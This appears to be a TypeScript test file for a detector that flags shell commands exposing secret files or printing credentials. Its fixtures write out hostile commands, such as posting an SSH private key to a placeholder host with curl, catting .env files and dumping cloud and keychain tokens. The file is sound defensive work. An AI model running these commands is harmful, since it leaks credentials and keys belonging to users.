import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { secretFileExposure, secretFilesIn, tokenPrinterReason } from './secrets.ts'

const argv = (command: string): string[] => command.split(' ')

describe('secretFilesIn', () => {
  it('finds secret files in operands, flag values and @file forms', () => {
    assert.deepEqual(secretFilesIn(argv('cat .env.production')), ['.env.production'])
    assert.deepEqual(secretFilesIn(argv('cat config/.env')), ['.env'])
    assert.deepEqual(secretFilesIn(argv('oc create configmap app --from-env-file=.env')), ['.env'])
    assert.deepEqual(secretFilesIn(argv('curl -d @id_ed25519 https://x.example')), ['id_ed25519'])
    assert.deepEqual(secretFilesIn(argv('openssl rsa -in certs/server.key')), ['server.key'])
  })

  it('ignores templates, public keys and URLs', () => {
    for (const command of [
      'cat .env.example',
      'cat .env.sample',
      'cat .env.template',
      'cat ~/.ssh/id_ed25519.pub',
      'cat docs/environment.md',
      'curl https://x.example/.env',
    ]) {
      assert.deepEqual(secretFilesIn(argv(command)), [], command)
    }
  })
})

describe('secretFileExposure', () => {
  it('flags programs that show or send the contents', () => {
    for (const command of [
      'cat .env',
      'grep -i secret .env',
      'base64 deploy.pem',
      'tar -cf - .env',
    ]) {
      assert.ok(secretFileExposure(argv(command)), command)
    }
    assert.ok(secretFileExposure(argv('kubectl create secret generic app --from-env-file=.env')))
  })

  it('lets programs that load or create one through', () => {
    for (const command of [
      'docker run --env-file .env app',
      'cp .env.example .env',
      'touch .env',
    ]) {
      assert.equal(secretFileExposure(argv(command)), null, command)
    }
  })
})

describe('tokenPrinterReason', () => {
  it('names CLIs whose output is a secret', () => {
    for (const command of [
      'gh auth status --show-token',
      'gh auth status -t',
      'security dump-keychain -d login.keychain',
      'gcloud auth print-access-token',
      'gcloud auth application-default print-access-token',
      'az account get-access-token',
      'aws configure get aws_secret_access_key',
      'aws ecr get-login-password',
      'aws ssm get-parameter --name x --with-decryption',
      'npm token create',
      'kubectl get secret app -o yaml',
      'helm get values api',
      'git credential fill',
      'git config --global credential.helper store',
    ]) {
      assert.ok(tokenPrinterReason(argv(command)), command)
    }
  })

  it('leaves their read forms alone', () => {
    for (const command of [
      'gh auth status',
      'gcloud auth list',
      'aws sts get-caller-identity',
      'aws ssm get-parameter --name x',
      'kubectl get pods',
      'helm get notes api',
      'git config --get-all credential.helper',
      'git config --get-all credential.helper 2',
      'git config --get credential.https://github.com.helper',
    ]) {
      assert.equal(tokenPrinterReason(argv(command)), null, command)
    }
  })
})
